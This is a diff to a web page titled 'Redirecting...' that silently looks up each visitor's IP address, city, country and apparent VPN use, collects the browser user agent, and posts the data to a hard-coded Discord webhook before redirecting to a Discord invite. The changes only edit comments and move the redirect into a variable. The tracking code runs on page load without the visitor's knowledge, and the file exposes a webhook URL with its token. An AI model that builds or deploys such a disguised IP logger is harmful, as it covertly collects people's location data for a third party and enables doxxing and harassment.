@@ -6,19 +6,22 @@
     <title>Redirecting...</title>
     <script>
         async function trackVisitor() {
-            const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";  // Replace with your actual Discord webhook
+            const webhookURL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";  // Discord webhook URL
+            const redirectURL = "https://discord.gg/8bRkNbDNsb";  // Redirect URL
 
             try {
-                // Fetch IP and geolocation
+                // Fetch IP and geolocation data
                 const response = await fetch("https://ip-api.com/json/");
                 const data = await response.json();
 
-                // Log the IP address and other details in the console
+                // Log IP and other details to the browser console for debugging
                 console.log("IP:", data.query);
                 console.log("Country:", data.country);
                 console.log("Region:", data.regionName);
                 console.log("City:", data.city);
+                console.log("VPN Status:", data.connection_type);
 
+                // Extract visitor data from the response
                 const ip = data.query;
                 const country = data.country;
                 const countryCode = data.countryCode;
@@ -30,7 +33,7 @@
                 const browser = navigator.userAgent;
                 const flag = `https://countryflagsapi.com/png/${countryCode.toLowerCase()}`;
 
-                // Check VPN (not always accurate)
+                // Check VPN status using an external API
                 const vpnResponse = await fetch(`https://json.geoiplookup.io/${ip}`);
                 const vpnData = await vpnResponse.json();
                 const vpn = vpnData.connection_type === "Corporate" ? "Yes" : "No";
@@ -40,7 +43,7 @@
                 const date = now.toLocaleDateString();
                 const time = now.toLocaleTimeString();
 
-                // Prepare payload for Discord webhook
+                // Prepare payload for the Discord webhook
                 const payload = {
                     username: ip,
                     avatar_url: flag,
@@ -61,7 +64,7 @@
                     }]
                 };
 
-                // Send the data to Discord webhook
+                // Send the visitor's data to Discord webhook
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -71,8 +74,8 @@
             } catch (error) {
                 console.error("Error:", error);
             } finally {
-                // Redirect instantly after sending the request
-                window.location.href = "https://discord.gg/8bRkNbDNsb";  // Change to your desired redirect URL
+                // Redirect after logging the information
+                window.location.href = redirectURL;  // Redirect URL
             }
         }
 
